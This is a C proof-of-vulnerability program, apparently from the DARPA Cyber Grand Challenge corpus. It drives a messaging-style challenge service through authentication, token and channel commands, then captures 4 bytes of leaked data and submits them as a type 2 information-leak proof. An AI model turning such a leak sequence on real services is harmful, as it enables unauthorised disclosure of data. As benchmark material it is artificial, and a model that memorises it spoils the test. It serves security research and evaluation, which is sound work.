/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include <libpov.h>
uint8_t*
hex_decode(const char *in, size_t len, uint8_t *out)
{
   unsigned int i, t, hn, ln;

   for (t=0, i=0; i < len; i+=2,++t) {
      hn = in[i] > '9' ? in[i] - 'a' + 10 : in[i] - '0';
      ln = in[i+1] > '9' ? in[i+1] - 'a' + 10 : in[i+1] - '0';

      out[t] = (hn << 4) | ln;
   }

   return out;
}

int main(void) {
   negotiate_type2();
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x2f\x61\x75\x74\x68\x2f\x46\x4c\x41\x47\x0a";
      static unsigned int write_00000_00000_len = 11;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x30\x3a\x70\x6f\x76\x75\x73\x65\x72\x3a\x70\x61\x73\x73\x77\x6f"
         "\x72\x64\x0a";
      static unsigned int write_00001_00000_len = 19;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         transmit_all(1, write_00001, write_00001_len);
      }
      free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read assign to var "flagPassword" from pcre: (.*)

      static char read_00000_regex[] = 
         "\x28\x2e\x2a\x29\x0a";
      assign_from_pcre("flagPassword", read_00000, read_00000_len - read_00000_ptr, read_00000_regex, 1);
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x2f\x61\x75\x74\x68\x2f\x46\x4c\x41\x47\x0a";
      static unsigned int write_00002_00000_len = 11;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         transmit_all(1, write_00002, write_00002_len);
      }
      free(write_00002);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x30\x3a\x70\x6f\x76\x75\x73\x65\x72\x3a";
      static unsigned int write_00003_00000_len = 10;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         transmit_all(1, write_00003, write_00003_len);
      }
      free(write_00003);
   } while (0);
   do {
      //*** writing data
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = append_var("flagPassword", write_00004, &write_00004_len);
      if (write_00004_len > 0) {
         transmit_all(1, write_00004, write_00004_len);
      }
      free(write_00004);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\x0a";
      static unsigned int write_00005_00000_len = 1;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         transmit_all(1, write_00005, write_00005_len);
      }
      free(write_00005);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 1);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x2f\x74\x6f\x6b\x65\x6e\x2f\x46\x4c\x41\x47\x0a";
      read_00001_ptr += data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 12);
      free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 1);
      if (read_00002_res) {} //silence unused variable warning
      //**** read assign to var "signature" from pcre: 0:povuser:([0-9a-f]{8}):FLAG

      static char read_00002_regex[] = 
         "\x30\x3a\x70\x6f\x76\x75\x73\x65\x72\x3a\x28\x5b\x30\x2d\x39\x61"
         "\x2d\x66\x5d\x7b\x38\x7d\x29\x3a\x46\x4c\x41\x47\x0a";
      assign_from_pcre("signature", read_00002, read_00002_len - read_00002_ptr, read_00002_regex, 1);
      free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\x2f\x74\x6f\x6b\x65\x6e\x2f\x46\x4c\x41\x47\x0a";
      static unsigned int write_00006_00000_len = 12;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         transmit_all(1, write_00006, write_00006_len);
      }
      free(write_00006);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\x30\x3a\x70\x6f\x76\x75\x73\x65\x72\x3a";
      static unsigned int write_00007_00000_len = 10;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         transmit_all(1, write_00007, write_00007_len);
      }
      free(write_00007);
   } while (0);
   do {
      //*** writing data
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = append_var("signature", write_00008, &write_00008_len);
      if (write_00008_len > 0) {
         transmit_all(1, write_00008, write_00008_len);
      }
      free(write_00008);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\x3a\x46\x4c\x41\x47\x0a";
      static unsigned int write_00009_00000_len = 6;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         transmit_all(1, write_00009, write_00009_len);
      }
      free(write_00009);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 1);
      if (read_00003_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00003_00000[] = 
         "\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2f\x46\x4c\x41\x47\x0a";
      read_00003_ptr += data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 16);
      free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 1);
      if (read_00004_res) {} //silence unused variable warning
      //**** read assign to var "token" from pcre: ([0-9a-zA-Z]{9}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}):latest

      static char read_00004_regex[] = 
         "\x28\x5b\x30\x2d\x39\x61\x2d\x7a\x41\x2d\x5a\x5d\x7b\x39\x7d\x2d"
         "\x5b\x30\x2d\x39\x61\x2d\x7a\x41\x2d\x5a\x5d\x7b\x38\x7d\x2d\x5b"
         "\x30\x2d\x39\x61\x2d\x7a\x41\x2d\x5a\x5d\x7b\x38\x7d\x2d\x5b\x30"
         "\x2d\x39\x61\x2d\x7a\x41\x2d\x5a\x5d\x7b\x38\x7d\x2d\x5b\x30\x2d"
         "\x39\x61\x2d\x7a\x41\x2d\x5a\x5d\x7b\x33\x7d\x29\x3a\x6c\x61\x74"
         "\x65\x73\x74\x0a";
      assign_from_pcre("token", read_00004, read_00004_len - read_00004_ptr, read_00004_regex, 1);
      free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00010_00000[] = 
         "\x2f\x69\x6e\x2f\x46\x4c\x41\x47\x0a";
      static unsigned int write_00010_00000_len = 9;
      unsigned char *write_00010 = NULL;
      unsigned int write_00010_len = 0;
      write_00010 = append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
      if (write_00010_len > 0) {
         transmit_all(1, write_00010, write_00010_len);
      }
      free(write_00010);
   } while (0);
   do {
      //*** writing data
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = append_var("token", write_00011, &write_00011_len);
      if (write_00011_len > 0) {
         transmit_all(1, write_00011, write_00011_len);
      }
      free(write_00011);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00012_00000[] = 
         "\x3a\x41\x41\x41\x41\x41\x3a\x68\x69\x67\x68\x0a";
      static unsigned int write_00012_00000_len = 12;
      unsigned char *write_00012 = NULL;
      unsigned int write_00012_len = 0;
      write_00012 = append_buf(write_00012, &write_00012_len, write_00012_00000, write_00012_00000_len);
      if (write_00012_len > 0) {
         transmit_all(1, write_00012, write_00012_len);
      }
      free(write_00012);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00013_00000[] = 
         "\x2f\x6f\x75\x74\x2f\x46\x4c\x41\x47\x0a";
      static unsigned int write_00013_00000_len = 10;
      unsigned char *write_00013 = NULL;
      unsigned int write_00013_len = 0;
      write_00013 = append_buf(write_00013, &write_00013_len, write_00013_00000, write_00013_00000_len);
      if (write_00013_len > 0) {
         transmit_all(1, write_00013, write_00013_len);
      }
      free(write_00013);
   } while (0);
   do {
      //*** writing data
      unsigned char *write_00014 = NULL;
      unsigned int write_00014_len = 0;
      write_00014 = append_var("token", write_00014, &write_00014_len);
      if (write_00014_len > 0) {
         transmit_all(1, write_00014, write_00014_len);
      }
      free(write_00014);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00015_00000[] = 
         "\x3a\x65\x6e\x64\x0a";
      static unsigned int write_00015_00000_len = 5;
      unsigned char *write_00015 = NULL;
      unsigned int write_00015_len = 0;
      write_00015 = append_buf(write_00015, &write_00015_len, write_00015_00000, write_00015_00000_len);
      if (write_00015_len > 0) {
         transmit_all(1, write_00015, write_00015_len);
      }
      free(write_00015);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x0a";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 1);
      if (read_00005_res) {} //silence unused variable warning
      //**** read assign to var "TYPE2_VALUE" from pcre: (.*)

      static char read_00005_regex[] = 
         "\x28\x2e\x2a\x29\x0a";
      assign_from_pcre("TYPE2_VALUE", read_00005, read_00005_len - read_00005_ptr, read_00005_regex, 1);
      free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   unsigned char *flag_string = NULL;
   unsigned int flag_string_len = 0;
   flag_string = append_var("TYPE2_VALUE", flag_string, &flag_string_len);
   flag_string[10] = '\0';

   uint8_t flag[5];
   // parse response
   hex_decode((char*)flag_string, 10, flag);
   //*** submitting type 2 POV results
   if(type2_submit(flag, 40))
      _terminate(2);
   
}
